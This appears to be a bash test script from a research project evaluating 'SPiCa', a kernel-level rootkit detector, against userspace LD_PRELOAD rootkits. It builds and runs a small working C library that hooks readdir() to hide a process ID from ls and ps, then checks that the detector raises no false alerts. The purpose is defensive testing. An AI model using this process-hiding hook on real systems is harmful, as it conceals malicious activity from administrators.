#!/bin/bash
# Userspace LD_PRELOAD rootkit test — covers JynxKit, Azazel, Symbiote, OrBit.
#
# These rootkits hook libc functions via LD_PRELOAD to hide processes/files
# from userspace tools (ps, ls). They do NOT modify kernel data structures.
#
# SPiCa is a kernel-level detector — these rootkits are OUT OF SCOPE.
# This test verifies:
#   1. SPiCa does NOT false-positive when LD_PRELOAD rootkits are active
#   2. The scheduler still sees the "hidden" process (it's only hidden
#      from userspace libc, not from the kernel)
#
# Expected: 0 false positives. The "hidden" process IS visible to
# sched_switch because LD_PRELOAD only intercepts userspace calls.
# The kernel scheduler has no concept of LD_PRELOAD hiding.
#
# This is actually a POSITIVE result for the paper: SPiCa's kernel-level
# observation is immune to userspace obfuscation. A process hidden by
# LD_PRELOAD from `ps` is still visible to sched_switch.

set -euo pipefail

ROOTKIT="${1:-generic}"
echo "[USERSPACE]  LD_PRELOAD rootkit test ($ROOTKIT)"
echo ""

echo "[SCOPE]      LD_PRELOAD rootkits operate in userspace."
echo "             They hook libc (readdir, open, readlinkat) to hide"
echo "             from ps/ls. They do NOT touch the kernel."
echo ""
echo "             SPiCa observes the kernel scheduler directly."
echo "             LD_PRELOAD hiding is INVISIBLE to the kernel."
echo "             sched_switch sees the process normally."
echo ""
echo "             This test is a NEGATIVE test: verify no false positives."
echo ""

# ── Build a minimal LD_PRELOAD rootkit ──────────────────────────────────────
# Instead of trying to compile 10-year-old JynxKit or proprietary Symbiote,
# we build a minimal .so that demonstrates the technique: hooks readdir
# to hide a specific PID from directory listings.

cat > /tmp/fake_rootkit.c << 'EOF'
#define _GNU_SOURCE
#include <dirent.h>
#include <dlfcn.h>
#include <string.h>
#include <stdlib.h>

// Hide this PID from directory listings (simulates process hiding)
static const char *HIDE_PID = "99999";

// Original readdir pointer
static struct dirent *(*orig_readdir)(DIR *) = NULL;

struct dirent *readdir(DIR *dirp) {
    if (!orig_readdir)
        orig_readdir = dlsym(RTLD_NEXT, "readdir");

    struct dirent *d;
    while ((d = orig_readdir(dirp)) != NULL) {
        if (strcmp(d->d_name, getenv("HIDE_PID") ?: HIDE_PID) == 0)
            continue;  // Skip hidden entry
        return d;
    }
    return NULL;
}
EOF

echo "[BUILD]      Compiling minimal LD_PRELOAD rootkit..."
gcc -shared -fPIC -o /tmp/fake_rootkit.so /tmp/fake_rootkit.c -ldl 2>&1 || {
    echo "[ERROR]      gcc not available — install build-essential"
    exit 1
}
echo "[OK]         Built /tmp/fake_rootkit.so"

# ── Start a "hidden" process ────────────────────────────────────────────────
HIDDEN_PID=99999
# We can't actually get PID 99999, so use whatever we get and set HIDE_PID
sleep 600 &
REAL_PID=$!
export HIDE_PID="$REAL_PID"

echo "[DEPLOY]     Hidden process: PID $REAL_PID"
echo "[DEPLOY]     LD_PRELOAD will hide it from readdir() (ls, ps, etc.)"

# ── Verify the process IS visible to the kernel (via /proc directly) ────────
echo ""
echo "[VERIFY]     Kernel visibility (bypasses LD_PRELOAD):"
# This read bypasses LD_PRELOAD because we read /proc from a clean shell
kill -0 "$REAL_PID" 2>/dev/null && echo "             PID $REAL_PID exists (kernel sees it)" || echo "             PID not found"

# ── Verify the process is hidden from userspace tools ───────────────────────
echo ""
echo "[VERIFY]     Userspace visibility (with LD_PRELOAD):"
LD_PRELOAD=/tmp/fake_rootkit.so ls /proc/$REAL_PID 2>/dev/null && \
    echo "             PID still visible (LD_PRELOAD didn't work)" || \
    echo "             PID hidden from userspace (LD_PRELOAD active)"

echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  EXPECTED OUTCOME                                           ║"
echo "║                                                             ║"
echo "║  1. SPiCa sees the process via sched_switch (kernel-level)  ║"
echo "║  2. LD_PRELOAD hiding is invisible to the kernel             ║"
echo "║  3. SPiCa fires ZERO alerts (no DKOM, no GHOST)             ║"
echo "║  4. The process is NOT hidden from SPiCa — only from ps     ║"
echo "║                                                             ║"
echo "║  Paper framing: SPiCa's kernel-level observation is          ║"
echo "║  IMMUNE to userspace obfuscation. LD_PRELOAD rootkits        ║"
echo "║  (JynxKit, Azazel, Symbiote, OrBit) cannot blind SPiCa.     ║"
echo "║  However, SPiCa does not DETECT them either — they are      ║"
echo "║  out of scope. Userspace detection requires separate tools.  ║"
echo "╚══════════════════════════════════════════════════════════════╝"

sleep 5
ALERTS=$(grep -c '\[DKOM\]\|\[TAMPER\]\|\[SILENT\]\|\[GHOST\]' /tmp/spica.log 2>/dev/null || echo "0")
if [ "$ALERTS" -eq 0 ]; then
    echo "[PASS]       Zero false positives — coexistence confirmed"
else
    echo "[FAIL]       Unexpected alert(s) — LD_PRELOAD should not trigger SPiCa"
    grep '\[DKOM\]\|\[TAMPER\]\|\[SILENT\]\|\[GHOST\]' /tmp/spica.log | tail -5
fi

# Cleanup
kill "$REAL_PID" 2>/dev/null || true
rm -f /tmp/fake_rootkit.so /tmp/fake_rootkit.c
